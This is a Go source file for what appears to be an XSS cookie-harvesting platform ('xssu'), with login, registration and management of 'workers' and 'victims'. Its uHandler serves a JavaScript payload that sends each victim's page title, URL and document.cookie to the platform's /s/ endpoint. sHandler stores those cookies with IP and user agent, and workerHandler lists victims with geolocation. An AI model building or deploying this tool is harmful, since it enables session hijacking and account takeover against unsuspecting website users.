package main

import (
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"html/template"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func loginHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	type AuthError struct {
		ErrStr string
	}

	if CheckSession(req) {
		http.Redirect(rw, req, "/home/", http.StatusFound)
		return
	}

	if req.Method == "POST" {
		username := req.FormValue("username")
		password := req.FormValue("password")
		if username != "" && password != "" {
			var u XssuUser
			orm.Where("username = ?", username).Find(&u)
			if u.Username == username && u.Password == HashPassword(password, u.Password[:16]) {
				session, _ := store.Get(req, "session")
				session.Values["username"] = username
				session.Values["userid"] = u.Userid
				session.Values["logged"] = "1"
				session.Save(req, rw)
				http.Redirect(rw, req, "/home/", http.StatusFound)
				return
			}
		}

		t, _ := template.ParseFiles("templates/html/login.html")
		t.Execute(rw, &AuthError{"Wrong username or password."})
		return
	}

	t, _ := template.ParseFiles("templates/html/login.html")
	t.Execute(rw, &AuthError{""})
}

func logoutHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	session, _ := store.Get(req, "session")
	session.Values["logged"] = "0"
	session.Save(req, rw)
	http.Redirect(rw, req, "/login/", http.StatusFound)
}

func homeHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	spage := req.URL.Path[6:]
	if spage == "" {
		spage = "1"
	}
	ipage, err := strconv.Atoi(spage)
	if err != nil {
		ipage = 1
	}

	a, _ := orm.SetTable("xssu_worker").SetPK("workerid").Where("userid = ?", GetUserID(req)).Select("count(*) as num").FindMap()
	var count int
	if len(a) >= 1 {
		count, _ = strconv.Atoi(string(a[0]["num"]))
	} else {
		count = 0
	}

	pageNum := count / 13
	if count%13 != 0 {
		pageNum = pageNum + 1
	}

	if ipage > pageNum {
		ipage = 1
	}
	if count == 0 {
		pageNum = 1
	}
	nextPage, previousPage := 1, pageNum
	if ipage+1 <= pageNum {
		nextPage = ipage + 1
	}
	if ipage-1 > 0 {
		previousPage = ipage - 1
	}
	start := 13 * (ipage - 1)

	var workers []XssuWorker
	orm.Where("userid = ?", GetUserID(req)).Limit(13, start).FindAll(&workers)

	WorkerMap := make(map[string]*WorkerInfo)
	for k, v := range workers {
		a, _ := orm.SetTable("xssu_victims").SetPK("vid").Where("hashid = ?", v.Hashid).Select("count(*) as num").FindMap()
		var count int
		if len(a) >= 1 {
			count, _ = strconv.Atoi(string(a[0]["num"]))
		} else {
			count = 0
		}
		WorkerMap[strconv.Itoa(k)] = &WorkerInfo{v.Hashid, ShowUnixTime(v.Time), v.Note, count}
	}

	t, _ := template.ParseFiles("templates/html/homepage.html")
	t.Execute(rw, &HomeData{WorkerMap, ipage, pageNum, nextPage, previousPage})
}

func notfoundHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	if req.URL.Path == "/" {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}
	t, _ := template.ParseFiles("templates/html/404.html")
	t.Execute(rw, nil)
}

func aboutHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	t, _ := template.ParseFiles("templates/html/about.html")
	t.Execute(rw, nil)
}

func resetpasswordHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())

	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	if req.Method == "POST" {
		password := req.FormValue("password")
		newpassword := req.FormValue("newpassword")
		repeatpassword := req.FormValue("repeatpassword")

		if newpassword == repeatpassword && CheckPassword(req, password) {
			t := make(map[string]interface{})
			t["password"] = HashPassword(newpassword, GenSalt(16))

			orm.SetTable("xssu_user").SetPK("userid").Where(GetUserID(req)).Update(t)
			http.Redirect(rw, req, "/home/", http.StatusFound)
			return
		}
	}
}

func resetemailHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())

	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	if req.Method == "POST" {
		password := req.FormValue("password")
		email := req.FormValue("email")
		if CheckPassword(req, password) {
			t := make(map[string]interface{})
			t["email"] = email

			orm.SetTable("xssu_user").SetPK("userid").Where(GetUserID(req)).Update(t)
		}

	}
	http.Redirect(rw, req, "/home/", http.StatusFound)
}

func settingHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	http.Redirect(rw, req, "/home/", http.StatusFound)
}

func addworkerHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	if req.Method == "POST" {
		note := req.FormValue("note")
		userid := GetUserID(req)
		unixtime := int(time.Now().Unix())
		hashid := HashID(unixtime)

		var worker XssuWorker
		worker.Userid = userid
		worker.Hashid = hashid
		worker.Note = note
		worker.Time = unixtime
		orm.Save(&worker)
	}

	http.Redirect(rw, req, "/home/", http.StatusFound)
}

func editworkerHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	if req.Method == "POST" {
		note := req.FormValue("note")
		hashid := req.FormValue("workerid")

		t := make(map[string]interface{})
		t["note"] = note

		orm.SetTable("xssu_worker").SetPK("workerid").Where("hashid = ?", hashid).Update(t)
	}
	http.Redirect(rw, req, "/home/", http.StatusFound)
}

func delworkerHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	hashid := req.URL.Path[11:]
	orm.SetTable("xssu_worker").Where("hashid = ? and userid = ?", hashid, GetUserID(req)).DeleteRow()
	http.Redirect(rw, req, "/home/", http.StatusFound)
}

func delrecordHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	if len(req.URL.Path) < 19 {
		http.Redirect(rw, req, "/home/", http.StatusFound)
		return
	}
	hashid := req.URL.Path[11:17]
	vid := req.URL.Path[18:]
	orm.SetTable("xssu_victims").Where("vid = ?", vid).DeleteRow()
	redirect := "/worker/" + hashid
	http.Redirect(rw, req, redirect, http.StatusFound)
}

func workerHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}

	if len(req.URL.Path) < 14 {
		http.Redirect(rw, req, "/home/", http.StatusFound)
		return
	}

	if len(req.URL.Path) == 14 {
		req.URL.Path = req.URL.Path + "/"
	}

	hashid := req.URL.Path[8:14]
	spage := req.URL.Path[15:]
	if spage == "" {
		spage = "1"
	}
	ipage, err := strconv.Atoi(spage)
	if err != nil {
		ipage = 1
	}

	a, _ := orm.SetTable("xssu_victims").SetPK("vid").Where("hashid = ?", hashid).Select("count(*) as num").FindMap()
	var count int
	if len(a) >= 1 {
		count, _ = strconv.Atoi(string(a[0]["num"]))
	} else {
		count = 0
	}

	pageNum := count / 13
	if count%13 != 0 {
		pageNum = pageNum + 1
	}

	if ipage > pageNum {
		ipage = 1
	}
	if count == 0 {
		pageNum = 1
	}
	nextPage, previousPage := 1, pageNum
	if ipage+1 <= pageNum {
		nextPage = ipage + 1
	}
	if ipage-1 > 0 {
		previousPage = ipage - 1
	}
	start := 13 * (ipage - 1)

	var victims []XssuVictims
	orm.Where("hashid = ?", hashid).Limit(13, start).FindAll(&victims)

	VictimMap := make(map[string]*VictimInfo)
	for k, v := range victims {
		VictimMap[strconv.Itoa(k)] = &VictimInfo{strconv.Itoa(v.Vid), v.Title, v.Url, v.Ua, v.Ip, ShowUnixTime(v.Time), v.Cookie, GetIPLocation(v.Ip), hashid}
	}

	t, _ := template.ParseFiles("templates/html/worker.html")
	t.Execute(rw, &VictimData{VictimMap, hashid, ipage, pageNum, nextPage, previousPage})
}

func modulesHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}
}

func uHandler(rw http.ResponseWriter, req *http.Request) {
	if len(req.URL.Path) > 8 {
		hashid := req.URL.Path[3:9]
		if CheckHashID(hashid) {
			jscode := `var s='https://` + domain + `/s/'; (function() { (new Image()).src = s+"?id="+id+"\&title="+document.title+"&url=" + escape(document.URL)+'&cookie=' + escape(document.cookie); })();`
			jscode = `var id='` + hashid + `';` + jscode
			fmt.Fprintf(rw, jscode)
		}
	}
}

func sHandler(rw http.ResponseWriter, req *http.Request) {
	hashid := req.FormValue("id")
	if CheckHashID(hashid) {
		var v XssuVictims
		v.Hashid = hashid
		v.Title = req.FormValue("title")
		v.Url = req.FormValue("url")
		v.Time = int(time.Now().Unix())
		v.Cookie = req.FormValue("cookie")
		v.Ip = strings.Split(req.RemoteAddr, ":")[0]
		v.Ua = req.UserAgent()
		orm.Save(&v)
	}
}

func searchHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}
}

func userHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())
	if !CheckSession(req) {
		http.Redirect(rw, req, "/login/", http.StatusFound)
		return
	}
}

func registerHandler(rw http.ResponseWriter, req *http.Request) {
	LogW(req.Host, req.Method, req.RequestURI, req.RemoteAddr, req.UserAgent(), req.Referer())

	type AuthError struct {
		ErrStr string
	}

	if req.Method == "POST" {
		username := req.FormValue("username")
		password := req.FormValue("password")
		email := req.FormValue("email")
		if username != "" && password != "" {
			var u XssuUser
			orm.Where("username = ?", username).Find(&u)
			if u.Username != "" {
				t, _ := template.ParseFiles("templates/html/register.html")
				t.Execute(rw, &AuthError{"Username unavailable"})
				return
			}
			u.Username = username
			u.Password = HashPassword(password, GenSalt(16))
			u.Email = email
			orm.Save(&u)
			http.Redirect(rw, req, "/login/", http.StatusFound)
		}
	}
	t, _ := template.ParseFiles("templates/html/register.html")
	t.Execute(rw, &AuthError{""})
}
